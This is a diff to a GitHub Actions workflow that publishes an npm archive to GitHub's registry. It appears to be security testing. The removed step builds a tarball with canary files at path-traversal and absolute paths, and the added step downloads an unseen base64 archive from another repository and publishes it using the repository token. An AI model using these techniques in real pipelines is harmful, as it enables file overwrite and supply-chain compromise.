@@ -10,25 +10,13 @@ jobs:
   publish:
     runs-on: ubuntu-latest
     steps:
-      - name: Publish crafted npm archive
+      - name: Publish secondary-controlled npm archive
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
           set -eux
           mkdir -p /tmp/g10npm
-          python3 - <<'PY'
-          import io, json, tarfile
-          files = {
-              "package/package.json": json.dumps({"name": "@apexblack-koala-274804/g10-npm-30853164675", "version": "1.0.0", "description": "G10 archive parser canary"}).encode(),
-              "package/index.js": b"module.exports = 'G10-NPM-CANARY';\n",
-              "package/../../g10-traversal-sentinel.txt": b"G10-TRAVERSAL-CANARY\n",
-              "/tmp/g10-absolute-sentinel.txt": b"G10-ABSOLUTE-CANARY\n",
-          }
-          with tarfile.open("/tmp/g10npm/g10-npm.tgz", "w:gz") as out:
-              for name, data in files.items():
-                  info = tarfile.TarInfo(name)
-                  info.size = len(data)
-                  out.addfile(info, io.BytesIO(data))
-          PY
+          curl -fsSL https://github.com/apexblack-kangaroo-1782761273/chainship-test-release/raw/refs/heads/main/g10-npm-package.tgz.b64 -o /tmp/g10npm/package.tgz.b64
+          base64 -d /tmp/g10npm/package.tgz.b64 > /tmp/g10npm/package.tgz
           printf '%s\n' "//npm.pkg.github.com/:_authToken=${GITHUB_TOKEN}" > /tmp/g10npmrc
-          NPM_CONFIG_USERCONFIG=/tmp/g10npmrc npm publish /tmp/g10npm/g10-npm.tgz --registry=https://npm.pkg.github.com
+          NPM_CONFIG_USERCONFIG=/tmp/g10npmrc npm publish /tmp/g10npm/package.tgz --registry=https://npm.pkg.github.com
